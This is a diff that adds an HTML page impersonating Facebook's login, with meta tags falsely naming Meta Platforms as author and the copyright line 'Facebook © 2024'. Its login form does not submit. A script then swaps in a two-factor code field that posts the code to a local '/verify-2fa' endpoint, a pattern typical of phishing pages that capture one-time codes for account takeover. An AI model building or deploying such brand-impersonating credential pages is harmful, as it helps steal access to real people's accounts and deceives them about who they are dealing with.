@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Facebook helps you connect and share with the people in your life.">
+  <meta name="author" content="Meta Platforms, Inc.">
+  <title>Facebook - Two-Factor Authentication</title>
+  <style>
+    /* Reset and Basic Styling */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Helvetica', 'Arial', sans-serif;
+      background-color: #000;
+      color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 0 20px;
+      overflow: hidden;
+      flex-direction: column;
+      position: relative; /* Allow the stars to be positioned */
+    }
+
+    /* Container Styling */
+    .container {
+      background-color: #000;
+      border-radius: 16px;
+      padding: 30px 40px;
+      text-align: center;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7);
+      position: relative;
+      z-index: 10;
+    }
+
+    /* Logo */
+    .logo {
+      font-size: 36px;
+      color: #ff8c00;
+      font-weight: bold;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      text-shadow: 0 0 10px rgba(255, 140, 0, 0.8), 0 0 20px rgba(255, 140, 0, 0.5);
+    }
+
+    @media (max-width: 600px) {
+      .logo {
+        font-size: 28px;
+      }
+    }
+
+    /* Input Fields */
+    input[type="text"], input[type="password"], input[type="number"] {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border: 2px solid #ff8c00;
+      border-radius: 10px;
+      background-color: #000;
+      color: #f1f1f1;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus {
+      border-color: #ff8c00;
+      box-shadow: 0 0 15px 5px rgba(255, 140, 0, 0.6),
+                  0 0 30px 10px rgba(255, 69, 0, 0.4),
+                  inset 0 0 10px rgba(255, 140, 0, 0.8);
+    }
+
+    /* Login Button */
+    button {
+      width: 100%;
+      padding: 16px;
+      background-color: #ff8c00;
+      color: #111;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: background-color 0.3s ease, transform 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #ffae42;
+      transform: scale(1.05);
+    }
+
+    /* Links */
+    .forgot-link, .signup-link {
+      display: inline-block;
+      margin: 15px 0;
+      color: #ff8c00;
+      font-size: 14px;
+      font-weight: bold;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    .forgot-link:hover, .signup-link:hover {
+      color: #ffa500;
+      text-decoration: underline;
+    }
+
+    /* Divider */
+    hr {
+      border: none;
+      border-top: 1px solid #ff8c00;
+      margin: 20px 0;
+    }
+
+    /* Footer */
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      text-align: center;
+      font-size: 12px;
+      color: #888888;
+      width: 100%;
+    }
+
+    /* Starry Background Animation */
+    .star {
+      position: absolute;
+      border-radius: 50%;
+      animation: starAnimation 5s linear infinite;
+    }
+
+    @keyframes starAnimation {
+      0% {
+        transform: translateX(-100px) translateY(-100px);
+        opacity: 0;
+      }
+      50% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateX(100vw) translateY(100vh);
+        opacity: 0;
+      }
+    }
+
+    .star:nth-child(odd) {
+      width: 3px;
+      height: 3px;
+      background: rgba(255, 255, 255, 0.7);
+      animation-duration: 7s;
+    }
+
+    .star:nth-child(even) {
+      width: 5px;
+      height: 5px;
+      background: rgba(255, 255, 255, 0.9);
+      animation-duration: 9s;
+    }
+  </style>
+  <script>
+    function showTwoFactorAuth() {
+      document.querySelector(".login-form").style.display = "none";
+      document.querySelector(".two-factor-form").style.display = "block";
+    }
+  </script>
+</head>
+<body>
+  <!-- Starry Background Animation -->
+  <div class="star" style="top: 10%; left: 30%;"></div>
+  <div class="star" style="top: 20%; left: 80%;"></div>
+  <div class="star" style="top: 40%; left: 60%;"></div>
+  <div class="star" style="top: 60%; left: 10%;"></div>
+  <div class="star" style="top: 70%; left: 90%;"></div>
+
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo">facebook</div>
+    <!-- Login Form -->
+    <form class="login-form" action="javascript:void(0);" onsubmit="showTwoFactorAuth()">
+      <input type="text" name="username" placeholder="Email or Phone" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <!-- Two-Factor Authentication Form -->
+    <form class="two-factor-form" style="display: none;" action="/verify-2fa" method="POST">
+      <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
+      <button type="submit">Verify</button>
+    </form>
+    <!-- Links -->
+    <a href="#" class="forgot-link">Forgotten password?</a>
+    <hr>
+    <a href="#" class="signup-link">Create New Account</a>
+  </div>
+  <!-- Footer -->
+  <div class="footer">
+    Facebook © 2024
+  </div>
+</body>
+</html>
